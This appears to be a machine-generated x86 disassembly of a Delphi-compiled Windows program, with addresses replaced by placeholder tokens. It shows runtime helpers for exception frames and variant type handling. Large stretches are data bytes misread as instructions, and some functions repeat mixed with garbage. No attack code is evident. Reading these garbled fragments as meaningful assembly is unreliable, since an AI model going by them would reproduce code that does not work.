add [ ecx + 0x40f00047 ] bl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax - 0x2bffb8df ] bl
cmp eax [ edi ]
add [ eax ] al
add [ eax ] al
xchg esp eax
and [ edi ] eax
xor al 0x3b
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x4721 ] dl
inc eax
inc edi
add [ eax ] al
add [ eax ] al
add [ ecx + 0x3e640047 ] cl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax - 0x6fffb8df ] cl
inc eax
inc edi
add [ eax ] al
add [ eax ] al
add [ ecx + 0x47 ] ah
add [ eax + 0x3d ] dh
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x21 ] ah
inc edi
add [ esp + edi + 0x47 ] dh
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_40d7e5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d7ec
retn
mov eax rw-data
call sub_40d250
call sub_40cdbc
call sub_40be38
mov eax rw-data
mov ecx 0x16
mov edx [ sub_40b910 ]
call sub_404a30
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404a30
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404a30
mov eax rw-data
call sub_403fa8
mov eax rw-data
mov edx [ r-xdata ]
call sub_404fe4
mov eax rw-data
mov edx [ r-xdata ]
call sub_404fe4
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404a30
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404a30
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404a30
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_404a30
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_404a30
mov eax rw-data
call sub_403fa8
mov eax rw-data
call sub_403fa8
mov eax rw-data
call sub_403fa8
mov eax rw-data
call sub_403fa8
mov eax rw-data
call sub_403fa8
mov eax rw-data
call sub_403fa8
mov eax rw-data
call sub_403fa8
mov eax rw-data
call sub_403fa8
mov eax rw-data
call sub_404688
mov eax rw-data
call sub_403fa8
sub_40d7f0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40d858
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d85f
retn
mov eax r-xdata
call sub_403d54
mov eax r-xdata
call sub_403d7c
cmp [ rw-data ] 0x0
je r-xdata
call sub_40bdb4
call sub_40beb8
call sub_40cddc
call sub_40c840
mov eax rw-data
mov edx r-xdata
call sub_403ffc
sub_40d890
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
mov ax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call VariantChangeType
mov eax 0x80004001
jmp r-xdata
pop ebp
retn 0x14
sub_40d8e4
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d93e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404230
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_4080e0
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d945
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
sub_40d950
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d9aa
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404230
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40958c
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d9b1
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
sub_40d9bc
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40da16
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404230
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_409560
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40da1d
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
sub_40da28
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40da82
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404230
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40ae64
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40da89
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
sub_40da94
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40daee
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404230
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_4095b8
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40daf5
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
sub_40db00
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_40db6d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_404230
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
call sub_4081cc
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
cmp [ ebp - 0x1 ] 0x1
cmc
sbb eax eax
mov edx [ ebp + 0x14 ]
mov [ edx ] ax
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40db74
lea eax [ ebp - 0x8 ]
call sub_403fa8
retn
sub_40db80
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40dbe0
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_409514
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_4047d4
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dbe7
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
sub_40dbf0
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40dc50
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_40a624
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_4047d4
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dc57
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
sub_40dc60
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40dcc4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
cmp [ ebp + 0x8 ] 0x1
sbb eax eax
inc eax
lea ecx [ ebp - 0x4 ]
xor edx edx
call sub_408268
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x14 ]
call sub_4047d4
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dccb
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
sub_40dcf4
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx ebx
mov ecx [ ebp + 0x8 ]
cmp [ ecx - 0x4 ] 0x0
je r-xdata
mov eax edx
pop ebx
pop ebp
retn
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
call GetProcAddress
mov edx eax
test edx edx
jne r-xdata
mov edx ebx
sub_40dd20
push ebp
mov ebp esp
push ecx
push r-xdata
call GetModuleHandleA
mov [ ebp - 0x4 ] eax
push ebp
mov edx sub_40d890
mov eax r-xdata
call sub_40dcf4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d8c0
mov eax r-xdata
call sub_40dcf4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d8c0
mov eax r-xdata
call sub_40dcf4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d8cc
mov eax r-xdata
call sub_40dcf4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d8cc
mov eax r-xdata
call sub_40dcf4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d8cc
mov eax r-xdata
call sub_40dcf4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d8cc
mov eax r-xdata
call sub_40dcf4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d8cc
mov eax r-xdata
call sub_40dcf4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d8cc
mov eax r-xdata
call sub_40dcf4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d8cc
mov eax r-xdata
call sub_40dcf4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d8cc
mov eax r-xdata
call sub_40dcf4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d8cc
mov eax r-xdata
call sub_40dcf4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d8d8
mov eax r-xdata
call sub_40dcf4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d8e4
mov eax r-xdata
call sub_40dcf4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d950
mov eax r-xdata
call sub_40dcf4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d9bc
mov eax r-xdata
call sub_40dcf4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40da28
mov eax r-xdata
call sub_40dcf4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40da94
mov eax r-xdata
call sub_40dcf4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40db00
mov eax r-xdata
call sub_40dcf4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40db80
mov eax r-xdata
call sub_40dcf4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dbf0
mov eax r-xdata
call sub_40dcf4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dc60
mov eax r-xdata
call sub_40dcf4
pop ecx
mov [ rw-data ] eax
pop ecx
pop ebp
retn
sub_40e02c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40e051
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e058
retn
sub_40e18c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0xe1
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
loop r-xdata
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ esi ] dl
inc ebp
push esi
popad
jb r-xdata
rcr [ edx + 0x40 ] 0x0
add [ eax + eax ] cl
add [ eax ] al
push esp
ja r-xdata
jo r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
xor [ eax ] eax
or al 0x32
add [ eax ] al
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
insb
outsd
ja r-xdata
popad
jae r-xdata
inc ebx
add [ eax - 0xfffbfcc ] ch
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x70795474
outsb
jbe r-xdata
jb r-xdata
add [ eax + eax ] cl
add [ eax ] al
push esp
ja r-xdata
inc ecx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jecxz r-xdata
inc ebp
jb r-xdata
add al dh
jb r-xdata
jns r-xdata
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x6f727245
jecxz r-xdata
jecxz r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x40 ] ah
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edi ] dl
inc ebp
push esi
popad
jb r-xdata
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
outsd
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add bl ah
inc eax
outsd
jb r-xdata
push esi
popad
jb r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jecxz r-xdata
outsd
jb r-xdata
add bl ah
inc ebx
popad
jb r-xdata
cmp dl ah
inc eax
add [ eax ] al
add [ eax ] al
add [ edx + esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx + esi ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
jecxz r-xdata
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edi ] dl
inc ebp
push esi
popad
jb r-xdata
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
xor [ eax ] eax
or al 0x32
xor al 0x40
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x40e3 0x0
or al 0x0
outsd
imul esp [ ecx + 0x6e ] 0x64614274
dec ecx
adc eax 0x72615645
jns r-xdata
add [ eax - 0xfffbfcc ] ch
outsb
jbe r-xdata
jb r-xdata
add [ eax + eax ] cl
add [ eax ] al
push esp
ja r-xdata
popad
outsb
je r-xdata
inc eax
add [ eax ] al
add [ eax ] al
rol [ eax ] 0xe3
jb r-xdata
popad
outsb
je r-xdata
add al dh
jb r-xdata
shr [ esp ] 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
ja r-xdata
add [ eax + eax ] cl
outsb
js r-xdata
dec ecx
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ 0x72615645 ] dl
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
inc eax
add [ eax + eax ] cl
add [ eax ] al
push esp
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
popad
insb
imul esp [ ecx + eax * 2 + 0x72 ] 0x72724567
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x65764f74
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0xc0040 ] bl
add [ eax ] al
push esp
ja r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp dl ah
inc eax
add [ eax ] al
lea eax [ eax ]
aam 0xe1
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
loope r-xdata
outsb
je r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
in al 0x40
add [ eax + eax ] cl
outsd
jb r-xdata
add [ eax ] al
push esp
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + 0xc0040 ] dl
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax ] bl
inc ebp
push esi
popad
jb r-xdata
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
xor [ eax ] eax
or al 0x32
mov al 0x34
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0xe4
nop
add [ eax + eax ] cl
add [ eax ] al
push esp
ja r-xdata
add [ esp + esi + 0x34b00040 ] ch
jb r-xdata
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
jb r-xdata
add [ eax ] al
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax ] bl
inc ebp
push esi
popad
jb r-xdata
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
[ eax ] eax
outsd
inc eax
add [ eax - 0x1b ] ah
inc eax
add [ eax ] al
add [ eax ] al
popad
outsb
je r-xdata
popad
jb r-xdata
popad
jns r-xdata
add [ eax ] al
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax * 2 + 0x69726156 ] dl
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
outsb
je r-xdata
popad
outsb
je r-xdata
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax ] bl
inc ebp
push esi
popad
jb r-xdata
inc eax
add al dh
insd
add [ eax ] al
xor [ eax ] eax
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
jb r-xdata
jb r-xdata
add al dh
outsd
arpl [ ebx + 0x65 ] bp
inc ebp
jb r-xdata
add [ eax + 0x32 ] cl
inc eax
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x73694474
jo r-xdata
outsb
js r-xdata
xor al 0x40
add al dh
jne r-xdata
jb r-xdata
inc ebp
add [ eax ] al
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edi ] dl
inc ebp
push esi
popad
jb r-xdata
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
jo r-xdata
popad
je r-xdata
inc eax
add ah bh
in al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
in al 0x40
add [ eax + eax ] cl
add [ eax ] al
push esp
ja r-xdata
outsd
jb r-xdata
add esp 0xffffffe4
push ebx
je r-xdata
in al dx
arpl [ gs : ebp + 0x64 ] si
inc ebp
jb r-xdata
jae r-xdata
popad
sub al 0xe6
inc eax
dec edi
dec bp
insd
outsd
jb r-xdata
je r-xdata
inc eax
add al cl
in eax 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
in eax 0x40
add [ eax + eax ] cl
add [ eax ] al
push esp
ja r-xdata
outsd
jb r-xdata
push ebp
push sub_40e68e
push [ fs : eax ]
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
jb r-xdata
inc ebp
jb r-xdata
inc eax
add [ esp + 0x40 ] dl
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
push 0x6f727245
jb r-xdata
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_4039e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e695
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
add [ edi + edi * 8 + 0x30 ] ah
outsd
jb r-xdata
xor eax eax
push ebp
push sub_40e727
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_410388
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_410388
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b734
call sub_4039e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e72e
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403fcc
retn
dec ebp
in al 0x8b
mov ebx eax
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] ch
inc eax
add [ eax + eax ] cl
add [ eax ] al
push esp
ja r-xdata
inc ebp
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1b ] ah
inc eax
add [ eax + eax ] cl
add [ eax ] al
push esp
ja r-xdata
outsd
push 0x0
xor eax eax
rcl [ ebp - 0x75 ] 0xec
xor [ eax ] eax
or al 0x32
inc eax
xor al 0x40
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
add [ eax ] al
add [ eax ] al
out 0x40 al
add [ eax ] al
add [ eax ] al
outsd
popad
jns r-xdata
sub_40e644
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e68e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_4039e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e695
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
sub_40e698
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40e727
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_410388
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_410388
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b734
call sub_4039e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e72e
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403fcc
retn
sub_40e734
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e77e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_4039e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e785
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
sub_40e788
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40e817
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_410388
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_410388
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b734
call sub_4039e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
